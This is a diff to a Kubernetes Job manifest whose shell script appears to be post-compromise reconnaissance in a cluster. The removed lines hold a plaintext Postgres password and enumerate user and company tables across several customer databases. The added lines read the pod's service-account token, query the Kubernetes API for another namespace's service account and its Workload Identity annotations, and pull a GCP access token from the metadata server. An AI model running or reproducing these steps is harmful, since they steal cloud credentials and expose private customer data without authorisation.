@@ -1,7 +1,7 @@
 apiVersion: batch/v1
 kind: Job
 metadata:
-  name: dune-db-v4
+  name: dune-db-v5
   namespace: default
 spec:
   ttlSecondsAfterFinished: 600
@@ -15,23 +15,26 @@ spec:
         command: ["/bin/sh","-c"]
         args:
         - |
-          apk add -q postgresql-client
-          export PGPASSWORD=wpEJl3WKOImARD9WgBsa
+          apk add -q jq
+          KUBE_TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
+          API="https://kubernetes.default.svc"
+          CA="/var/run/secrets/kubernetes.io/serviceaccount/ca.crt"
+          KUBE_NS="dune-api"
           
-          echo "=TACHYUS_TABLES="
-          psql -h 172.16.10.14 -p 6432 -U postgres -d "tachyus.com_db" -c "\dt" 2>&1
-          echo "=END="
+          echo "=DUNE_SA="
+          # Get the service account used by dune-api pods
+          SA=$(curl -sk --cacert $CA -H "Authorization: Bearer $KUBE_TOKEN" \
+            "$API/api/v1/namespaces/$KUBE_NS/pods" | jq -r '.items[0].spec.serviceAccountName')
+          echo "ServiceAccount: $SA"
           
-          echo "=USER_TABLES_ALL="
-          # Find which DBs have a users table
-          for DB in tachyus.com_db tachcorp_db contract_db slb_db rockefeller_db conoco_db; do
-            TABLES=$(psql -h 172.16.10.14 -p 6432 -U postgres -d "$DB" -tc "SELECT tablename FROM pg_tables WHERE tablename ILIKE '%user%' AND schemaname='public';" 2>&1)
-            if [ -n "$(echo $TABLES | tr -d ' ')" ]; then
-              echo "DB $DB has user tables: $TABLES"
-            fi
-          done
-          echo "=END_UT="
+          # Get SA details including annotations (Workload Identity)
+          curl -sk --cacert $CA -H "Authorization: Bearer $KUBE_TOKEN" \
+            "$API/api/v1/namespaces/$KUBE_NS/serviceaccounts/$SA" | jq '{name:.metadata.name, annotations:.metadata.annotations}'
+          echo "=END_SA="
           
-          echo "=CONTRACT_COMPANIES="
-          psql -h 172.16.10.14 -p 6432 -U postgres -d contract_db -c "SELECT * FROM companies LIMIT 10;" 2>&1
-          echo "=END_CC="
+          echo "=METADATA_TOKEN="
+          # Try to get GCP identity token from metadata server inside the dune-api pod would use
+          # We need to exec into the pod, but we can try from our own context
+          curl -s -H "Metadata-Flavor: Google" "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token" 2>&1 | head -c 200
+          echo ""
+          echo "=END_MT="
